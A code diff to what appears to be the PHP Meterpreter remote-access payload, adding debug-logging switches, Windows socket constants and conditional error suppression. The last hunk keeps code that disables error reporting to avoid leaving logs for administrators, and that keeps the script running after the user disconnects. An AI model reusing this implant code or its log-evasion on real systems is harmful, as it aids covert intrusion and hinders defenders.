@@ -42,8 +42,31 @@ function register_command($c, $i) {
   }
 }
 
+# Debugging payload definitions
+define("MY_DEBUGGING", false);
+define("MY_DEBUGGING_LOG_FILE_PATH", false);
+
+function my_logfile($str) {
+  if (MY_DEBUGGING && MY_DEBUGGING_LOG_FILE_PATH) {
+    if (!isset($GLOBALS['logfile'])) {
+      $GLOBALS['logfile'] = fopen(MY_DEBUGGING_LOG_FILE_PATH, 'a');
+
+      if (!$GLOBALS['logfile']) {
+        my_print("Failed to open debug log file");
+      }
+    }
+
+    if ($GLOBALS['logfile']) {
+      fwrite($GLOBALS['logfile'], "$str\n");
+    }
+  }
+}
+
 function my_print($str) {
-  #error_log($str);
+  if (MY_DEBUGGING) {
+    error_log($str);
+    my_logfile($str);
+  }
 }
 
 my_print("Evaling main meterpreter stage");
@@ -124,6 +147,13 @@ define("CHANNEL_CLASS_BUFFERED", 0);
 define("CHANNEL_CLASS_STREAM",   1);
 define("CHANNEL_CLASS_DATAGRAM", 2);
 define("CHANNEL_CLASS_POOL",     3);
+
+
+##
+# Windows Constants
+##
+define("WIN_AF_INET", 2);
+define("WIN_AF_INET6", 23);
 
 #
 # TLV Meta Types
@@ -1072,10 +1102,10 @@ function connect($ipaddr, $port, $proto='tcp') {
   # IPv6 requires brackets around the address in some cases, but not all.
   # Keep track of the un-bracketed address for the functions that don't like
   # brackets, specifically socket_connect and socket_sendto.
-  $ipf = AF_INET;
+  $ipf = WIN_AF_INET;
   $raw_ip = $ipaddr;
   if (FALSE !== strpos($ipaddr, ":")) {
-    $ipf = AF_INET6;
+    $ipf = WIN_AF_INET6;
     $ipaddr = "[". $raw_ip ."]";
   }
 
@@ -1411,11 +1441,13 @@ function remove_reader($resource) {
 
 ob_implicit_flush();
 
-# For debugging
-#error_reporting(E_ALL);
 # Turn off error reporting so we don't leave any ugly logs.  Why make an
 # administrator's job easier if we don't have to?  =)
-error_reporting(0);
+if (MY_DEBUGGING) {
+  error_reporting(E_ALL);
+} else {
+  error_reporting(0);
+}
 
 @ignore_user_abort(true);
 # Has no effect in safe mode, but try anyway
